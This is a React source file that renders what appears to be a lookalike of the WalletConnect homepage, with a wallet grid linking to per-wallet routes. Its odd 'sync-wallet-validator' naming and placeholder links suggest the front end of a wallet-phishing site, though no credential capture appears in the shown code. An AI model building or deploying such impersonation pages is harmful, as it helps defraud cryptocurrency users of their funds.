import React,{useRef} from 'react';
import {data} from './data';
import { Link } from 'react-router-dom';

const Index = () => {

    var showMore = useRef(null)

    const HandleShowMoreWallets = ()=>{
        if(showMore.classList.contains('hidden')){
            showMore.classList.remove('hidden');
            showMore.classList.add('show');
        }else{
            showMore.classList.remove('show');
            showMore.classList.add('hidden');
        }
    }
    return (
        <center>
            <div className="top">
                <Link to="index.html#footer" className="left">Github</Link>

                <Link to="/" className="left">Docs</Link>
                <Link to="/" className="main"><img src="./images/logo.svg" alt="logo" /></Link>
                <Link to="/" className="left">Wallets</Link>
                <Link to="/" className="left">Apps</Link>
            </div>
            <br></br>
            <div className="sync-wallet-validator">WalletConnect</div>
            <div className="open-protocol">Open protocol for connecting Wallets to Dapps</div>
            <br></br>
            <div className="banner">
                <img src="./images/banner (2).png" alt="WalletConnect" />
            </div>
            <div className="about">
                <h2 className="question">What is WalletConnect?</h2>
                <p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking.
                    A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser
                    extension wallets.</p>
                <br></br>
                <h2 className="question">How does it work?</h2>
                <p>WalletConnect connects web applications to supported <a href="/" className="a-question">mobile wallets</a>. WalletConnect session is started by a scanning a QR
                    code (desktop) or by clicking an application deep link (mobile).</p>
            </div>
            <div className="walles" id="wallets">
                <h1 className="question ">Wallets</h1>
                <p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
                <br></br>
                <div className="all">

                    {data && data.slice(0,15).map((wallet, i) => (
                        <div className="apps" key={i}>
                           <Link to= {`/wallet/${wallet.name}`}><img src={wallet.image} alt="" /></Link>
                            <br></br>
                            {wallet.name}
                        </div>
                    ))}
                </div>
                <br></br>
                <button className="btn" id="btn" onClick={e=>HandleShowMoreWallets()}>Show More ↓</button>
                <br></br>
                <div ref={e=> showMore = e} className="hidden" id="hidden">
                    <div className="all">
                    {data && data.slice(15,30).map((wallet, i) => (
                        <div className="apps" key={i}>
                            <Link to= {`/wallet/${wallet.name}`}><img src={wallet.image} alt="" /></Link>
                            <br></br>
                            {wallet.name}
                        </div>
                    ))}
                    </div>
                </div>
            </div>
            <footer><div id="footer">
                <p><img src="./images/discord.svg" alt="" className="footimg" />  <a href="https://discord.gg/jhxMvxP">Discord</a></p>
                <br></br>
                <p><img src="./images/telegram.svg" alt="" className="footimg" />  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br></br>
                <p><img src="./images/twitter.svg" alt="" className="footimg" />  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br></br>
                <p><img src="./images/github.svg" alt="" className="footimg" />  <a href="https://github.com/walletconnect">Github</a></p><br></br>
            </div></footer>
        </center>
    )
}

export default Index
